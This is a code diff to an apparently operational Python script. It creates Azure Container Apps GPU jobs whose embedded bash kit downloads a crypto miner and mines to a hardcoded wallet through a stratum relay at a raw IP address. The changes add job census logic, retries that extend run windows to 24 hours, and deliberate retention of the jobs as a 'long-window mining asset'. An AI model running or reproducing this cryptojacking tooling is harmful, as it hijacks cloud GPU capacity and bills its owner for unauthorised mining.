@@ -28,18 +28,19 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133778"
-INTENT = "133778"
-NONCE = "x1337refill"
+TAG = "C211_I133895"
+INTENT = "133895"
+NONCE = "x1337keep"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_NAME = ("c211i133778" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+SA_NAME = ("c211i133895" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 CONT = "c211"
 JOB_NAME = "c211-133778"
 MINE_S = 21000
+REPLICA_PLAN = [(86400, 82800), (43200, 41400), (21600, 21000)]
 BUDGET = 1500
 WALLET = "prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr"
 RELAY = "stratum+tcp://217.15.164.237:2083"
@@ -181,7 +182,7 @@ KIT = r"""#!/bin/bash
 # C211-I133778 refill kit: pinned peakminer 2.20.0, ONE process on GPU 0, long window.
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
-WK="node-h$(echo -n "$H" | sha256sum | cut -c1-8)"
+WK="node-hm$(echo -n "$H" | sha256sum | cut -c1-6)"
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__ENV__-$H.txt?$Q"
 PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
 W="__WALLET__"; RC=none; PHASE=init
@@ -244,11 +245,11 @@ exit 0
 """
 
 
-def kit_cmd(base, q):
+def kit_cmd(base, q, mines=None):
     return (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
             .replace("__WALLET__", WALLET).replace("__PMURL__", PM_URL)
             .replace("__PMSHA__", PM_SHA).replace("__RELAY__", RELAY)
-            .replace("__DIRECT__", DIRECT).replace("__MINES__", str(MINE_S)))
+            .replace("__DIRECT__", DIRECT).replace("__MINES__", str(mines or MINE_S)))
 
 
 def wait_gone(tok, url, label, tries=20, sleep_s=10):
@@ -312,7 +313,7 @@ def normloc(v):
 
 
 def jname_for(env):
-    s = ("c211-133778-" + env.replace("c211-", "")).lower()
+    s = ("c211-k-" + env.replace("c211-", "")).lower()
     s = re.sub(r"[^a-z0-9-]", "-", s)
     return s[:32]
 
@@ -456,6 +457,51 @@ def main():
     emit("env-select", gpu_envs_total=gpu_envs_total, targeted=len(ready),
          proven_first=";".join(PROVEN))
 
+    # ---------- 2b) CENSUS of ALL Container Apps jobs in the RG: env, last execution
+    # state, remaining window. A live job (>90 min left) blocks a duplicate fire.
+    live_envs = {}
+    census = []
+    st, jl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs"
+                      "?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=120)
+    jrows = (jl.get("value") or []) if isinstance(jl, dict) else []
+    emit("capp-census-list", http=st, n=len(jrows))
+    for jx in jrows:
+        nmx = jx.get("name") or ""
+        jp = jx.get("properties") or {}
+        env_id = str(jp.get("environmentId") or "")
+        envn = env_id.rstrip("/").split("/")[-1] if env_id else "?"
+        rtx = ((jp.get("configuration") or {}).get("replicaTimeout")) or 0
+        jid = str(jx.get("id") or "").rstrip("/")
+        status, start, execn = "NONE", None, None
+        if jid:
+            stx, ex = arm(tok, "%s/executions?api-version=%s" % (jid, APP_VER), timeout=60)
+            rowsx = (ex.get("value") or []) if isinstance(ex, dict) else []
+            best = None
+            for e in rowsx:
+                ep = e.get("properties") or {}
+                key = (ep.get("startTime") or "", e.get("name") or "")
+                if best is None or key > best[0]:
+                    best = (key, ep.get("status"), ep.get("startTime"), e.get("name"))
+            if best:
+                status, start, execn = best[1], best[2], best[3]
+        rem = None
+        if start and status in ("Running", "Processing", "Pending"):
+            try:
+                t0 = time.mktime(time.strptime(start[:19], "%Y-%m-%dT%H:%M:%S"))
+                rem = int(int(rtx) - (time.time() - t0))
+            except Exception:  # noqa: BLE001
+                rem = None
+        rec = {"job": nmx, "env": envn, "status": status, "exec": execn,
+               "start": start, "rt": rtx, "rem": rem}
+        census.append(rec)
+        emit("capp-census", job=nmx, env=envn, status=status, exec=execn,
+             start=(start or ""), rt=rtx, rem=("NA" if rem is None else rem))
+        if status in ("Running", "Processing", "Pending") and (rem is None or rem > 5400):
+            live_envs[envn] = nmx
+    emit("capp-census-summary", jobs=len(census), live=len(live_envs),
+         live_map=";".join("%s:%s" % (k, v) for k, v in live_envs.items())[:900],
+         states=";".join("%s=%s/rem=%s" % (c["job"], c["status"], c["rem"]) for c in census)[:1600])
+
     # ---------- 3) identity + quotas: az account show/list, role assignments,
     # Microsoft.App GPU per region, Compute NC/ND/NV per region ----------
     r = run(["az", "account", "list", "-o", "json"], timeout=120)
@@ -550,7 +596,10 @@ def main():
             nm = jname_for(x["name"])
             url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                    "?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
-            cmd = kit_cmd(cont_base, q).replace("__ENV__", x["name"])
+            if x["name"] in live_envs:
+                emit("capp-job-skip", env=x["name"], name=nm, because="LIVE_JOB",
+                     live=live_envs[x["name"]])
+                continue
             body = {"location": x["region"], "tags": {"c211": INTENT, "nonce": NONCE},
                     "properties": {"environmentId": x["id"], "workloadProfileName": x["profile"],
                                    "configuration": {"triggerType": "Manual",
@@ -561,28 +610,31 @@ def main():
                                                          "parallelism": par}},
                                    "template": {"containers": [{
                                        "name": "gpu", "image": IMAGE,
-                                       "command": ["/bin/bash", "-c", cmd],
+                                       "command": ["/bin/bash", "-c",
+                                                   kit_cmd(cont_base, q).replace("__ENV__", x["name"])],
                                        "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
-            st, b = arm(tok, url, method="PUT", body=body, timeout=180)
+            st = None
+            b = None
+            rt_used = None
+            for rt_try, mines_try in REPLICA_PLAN:
+                body["properties"]["configuration"]["replicaTimeout"] = rt_try
+                body["properties"]["template"]["containers"][0]["command"] = [
+                    "/bin/bash", "-c",
+                    kit_cmd(cont_base, q, mines_try).replace("__ENV__", x["name"])]
+                st, b = arm(tok, url, method="PUT", body=body, timeout=180)
+                if st in (200, 201, 202):
+                    rt_used = rt_try
+                    break
+                emit("capp-job-create-retry", env=x["name"], name=nm, rt=rt_try,
+                     **err_of(st, b))
             emit("capp-job-create", env=x["name"], name=nm, parallelism=par,
-                 profile=x["profile"], region=reg, **err_of(st, b))
+                 rt=rt_used, profile=x["profile"], region=reg, **err_of(st, b))
             j = {"env": x["name"], "name": nm, "url": url, "base": url.split("?")[0],
-                 "region": reg, "par": par, "execname": None, "final": None}
-            if st in (200, 201, 202):
-                st2, b2 = arm(tok, j["base"] + "/start?api-version=" + APP_VER,
-                              method="POST", body={}, timeout=120)
-                j["execname"] = b2.get("name") if isinstance(b2, dict) else None
-                emit("capp-job-start", env=x["name"], name=nm, http=st2,
-                     execname=j["execname"],
-                     **({} if st2 in (200, 201, 202) else err_of(st2, b2)))
-                if st2 not in (200, 201, 202) or not j["execname"]:
-                    j["final"] = "START_FAILED"
-            else:
-                j["final"] = "CREATE_FAILED"
+                 "region": reg, "par": par, "execname": None, "final": None, "rt": rt_used}
             jobs.append(j)
 
     # ---------- 5) poll executions + incremental per-replica blob read ----------
-    deadline = time.time() + BUDGET
+    deadline = time.time() + (BUDGET if jobs else 60)
     seen = {}
     envs_seen = set()
     uu_seen = set()
@@ -684,7 +736,7 @@ def main():
         emit("job-readback", env=j["env"], name=j["name"], job_http=stj,
              prov=pj.get("provisioningState"), status=pj.get("status"),
              exec_http=ste, exec_status=pe.get("status"),
-             start=pe.get("startTime"), replica_timeout=21600)
+             start=pe.get("startTime"), replica_timeout=str(sorted(set(str(j.get("rt")) for j in jobs))))
         if ste == 200 and str(pe.get("status")) in ("Running", "Processing", "Pending"):
             live.append(j["name"])
     # storage account + 24h SAS intentionally kept so replicas keep writing status
@@ -693,7 +745,7 @@ def main():
          envs_with_blobs=len(per), total_uuids=len(alluu),
          accepted_max=max([e["accmax"] for e in per.values()] or [0]),
          keep_running=";".join(live)[:1200], sa=SA_NAME, sas_end=se,
-         replica_timeout=21600, note="jobs NOT deleted; long-window mining asset")
+         replica_timeout=str(sorted(set(str(j.get("rt")) for j in jobs))), note="jobs NOT deleted; long-window mining asset")
     emit("DONE", phase="refill", nonce=NONCE, jobs_total=len(jobs),
          jobs_started=sum(1 for j in jobs if j.get("execname")),
          job_create_failed=sum(1 for j in jobs if j.get("final") == "CREATE_FAILED"),
